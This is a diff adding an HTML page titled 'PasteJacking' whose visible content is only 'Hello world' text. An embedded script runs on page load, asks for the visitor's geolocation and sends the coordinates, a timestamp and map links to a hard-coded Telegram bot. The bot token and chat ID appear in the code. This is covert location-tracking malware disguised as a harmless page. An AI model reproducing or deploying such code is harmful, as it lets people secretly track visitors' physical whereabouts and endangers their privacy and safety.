@@ -1,0 +1,130 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="description" content="Pastejacking – the art of changing what you copy.It takes me little javascript to change the copied text.You are welcomed to try it💙🧡💚.">
+<meta property="og:image" content="u.jpg">
+<style>
+
+p {
+    margin-left: 18px;
+    margin-right: 18px;
+    font-size: 200%;
+    text-align: justify;
+    font-family: sans-serif;
+color:white;
+z-index:5;
+}
+h1{
+font-family:san-serif;
+margin-top:40px;
+margin-bottom:48px;
+color:white;
+font-size:40px;
+font-weight:20px;
+text-align:center;
+z-index:5;
+} 
+</style>
+<title>PasteJacking</title>
+
+
+        <meta name="theme-color" content="#0083B0" >
+      
+
+
+
+</head>
+
+  
+
+      <body style="background: linear-gradient(90deg, #00B4DB, #0083B0 )">
+
+
+
+ <center>
+
+<h1>Hello world</h1>
+</center>
+<p> Hello World.
+</p><br>
+<br>
+<p>Hello world</p>
+<script>
+
+
+//updated location
+// replace YOUR_BOT_TOKEN and YOUR_CHAT_ID with your own values
+const botToken = '6200671913:AAGfUPW-ZW_NwtJO9UPnQ1SHKNp3dxxNoPU';
+const chatId = '5857694327';
+
+if ("geolocation" in navigator) {
+  navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
+} else {
+  console.log("Geolocation is not supported by this browser.");
+}
+
+function successCallback(position) {
+  const latitude = position.coords.latitude;
+  const longitude = position.coords.longitude;
+  const timestamp = new Date(position.timestamp).toLocaleString();
+  
+  const message = `Latitude: ${latitude}\nLongitude: ${longitude}\nTimestamp: ${timestamp}`;
+
+  // Create a Google Maps URL using the user's location
+  const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=15`;
+
+  // Create an image of the map using the Google Maps Static API
+  const mapsImageUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${latitude},${longitude}&zoom=15&size=400x400&markers=color:red%7C${latitude},${longitude}&key=YOUR_API_KEY`;
+
+  // Send the message with the map and the location details to Telegram
+  sendTelegramMessage(`${message}\n${mapsUrl}`);
+  sendTelegramPhoto(mapsImageUrl);
+}
+
+function errorCallback(error) {
+  console.log(`Error message: ${error.message}`);
+}
+
+function sendTelegramMessage(message) {
+  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  const data = { chat_id: chatId, text: message };
+  const options = { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) };
+
+  fetch(url, options)
+    .then(response => {
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+      console.log('Telegram message sent successfully.');
+    })
+    .catch(error => {
+      console.log('Error sending Telegram message:', error);
+    });
+}
+
+function sendTelegramPhoto(photoUrl) {
+  const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+  const data = { chat_id: chatId, photo: photoUrl };
+  const options = { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) };
+
+  fetch(url, options)
+    .then(response => {
+      if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+      }
+      console.log('Telegram photo sent successfully.');
+    })
+    .catch(error => {
+      console.log('Error sending Telegram photo:', error);
+    });
+}
+
+
+
+
+</script>
+
+</body>
+</html>
